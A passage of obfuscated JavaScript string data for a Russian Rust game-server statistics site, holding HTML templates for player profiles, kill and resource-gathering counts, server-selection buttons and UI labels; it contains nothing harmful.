'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Вертолетов</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/heli.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'display', 'textContent', 'PRODUCTS', 'join', 'KDR', '<div>', 'explosive.satchel', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20rightarm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Правая\x20рука</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>', 'panthers', 'checked', 'ggrust.gamestores.app', '\x22\x20data-table=\x22', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-leaf\x20profile-icon\x22></i>Оленей\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>С4</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/explosive.timed.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x0a\x0a\x20\x20</div>', 'forEach', 'wipeModal', '\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22player-info-container\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-info-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22avatar-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustaria.ru/getAvatar.php?steamid=', 'pumpkin', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-leaf\x20profile-icon\x22></i>Камня\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'removeChild', 'ammo.rocket.hv', 'whenwipe', '.custom-save-image-btn', 'dispatchEvent', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>МВК</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/hq.metal.ore.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'stones', '\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alt=\x22Аватар\x22\x20class=\x22avatar\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22nickname\x20text-3xl\x20font-bold\x22>', 'category', 'HEADER', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Кабанов</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/boar.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'cookie', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__item-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/time2.png\x22\x20class=\x22points\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__title\x22>Онлайн\x20за\x20вайп</div><span\x20class=\x22user-stat__value\x22>', 'RightArmHits', '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-score\x22>', 'https://rustaria.ru/stats.php?table=', '.stats_button', 'querySelector', 'value', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20rightleg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Правое\x20бедро</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>', '.statsBtn.active', 'white.berry', 'Reason', 'Accept', 'addToast', 'flex', 'substring', 'btn-details', 'Форматированные\x20данные:', '<a\x20class=\x22HeaderNav-module__link__basket\x22\x20href=\x22/profile/basket\x22><svg\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20width=\x221rem\x22\x20height=\x221rem\x22\x20viewBox=\x220\x200\x2024\x2024\x22><path\x20fill=\x22#4b9ad4\x22\x20d=\x22M17\x2018c-1.11\x200-2\x20.89-2\x202a2\x202\x200\x200\x200\x202\x202a2\x202\x200\x200\x200\x202-2a2\x202\x200\x200\x200-2-2M1\x202v2h2l3.6\x207.59l-1.36\x202.45c-.15.28-.24.61-.24.96a2\x202\x200\x200\x200\x202\x202h12v-2H7.42a.25.25\x200\x200\x201-.25-.25c0-.05.01-.09.03-.12L8.1\x2013h7.45c.75\x200\x201.41-.42\x201.75-1.03l3.58-6.47c.07-.16.12-.33.12-.5a1\x201\x200\x200\x200-1-1H5.21l-.94-2M7\x2018c-1.11\x200-2\x20.89-2\x202a2\x202\x200\x200\x200\x202\x202a2\x202\x200\x200\x200\x202-2a2\x202\x200\x200\x200-2-2\x22/></svg></a>', '\x27\x20not\x20found.', 'datetimewipe', 'Промокод\x20успешно\x20активирован', 'WILL_MOUNT', 'ResourceGatheringStats', 'tableContainer', 'returnValue', 'Toast-module__toast', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22flex\x20items-center\x20justify-center\x20flex-col\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22form-control\x20flex\x20flex-col\x20justify-center\x20items-center\x20mb-5\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22text-base-content\x20mb-3\x20text-3xl\x20font-bold\x22>', 'Place', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<section\x20data-v-22378e5b=\x22\x22\x20class=\x22gather\x22>\x0a\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-header\x22>Добыто</h1>\x0a\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-container-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-egg\x20profile-icon\x22></i>Металлолома\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'table', 'shopInfo', 'div', '&server=', 'Мониторинг', 'WIDGETS', 'russian_stats2', 'https://steamcommunity.com/profiles/', 'entries', '.download', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Разрывной</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/Explosive_5.56_Rifle_Ammo_icon.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'contains', '\x22\x20data-table=\x22GGRustMOSCOW\x22>МОСКОВСКИЙ\x20#1</button>\x0a\x20\x20\x20\x20<button\x20id=\x22classica_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22', 'righthand', 'block', 'Suicides', 'querySelectorAll', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Металлолома</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/scrap.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22gather\x22>\x0a\x20\x20\x20\x20\x20\x20<h1\x20class=\x22profile-data-header\x22>Статистика\x20сбора\x20<span\x20style=\x22color:\x20green;\x22>(Очков\x20всего:\x20', 'wolves', '#topplayer-custom', 'click', 'https://stats.ggrust.ru/ds.php', 'data-table', 'place-2', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Зажигательная</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/ammo.rocket.fire_512.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'oncontextmenu', 'Bradleys', 'split', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Суицидов</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/10183.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'text', 'steamid', 'Requesting\x20new\x20invite...', 'discord-guild-name', '1904754AkvvHG', 'Connected', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Скоростная</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/ammo.rocket.hv.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'Когда\x20вайп?', '#wipeModal', '\x22\x20data-timeframe=\x22', 'classica_stats', 'asc', 'Нет\x20данных\x20для\x20отображения', 'className', 'loading-indicator', 'appendChild', 'location', 'body', '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', 'playedTime_PlayedForWipe', 'src', '\x22\x20data-table=\x22GGRustRUSSIA2\x22>РОССИЙСКИЙ\x20x2</button>\x0a\x20\x20\x20\x20<button\x20id=\x22moscow_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22', 'onload', 'destroy', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Металла</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/metal.ore.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x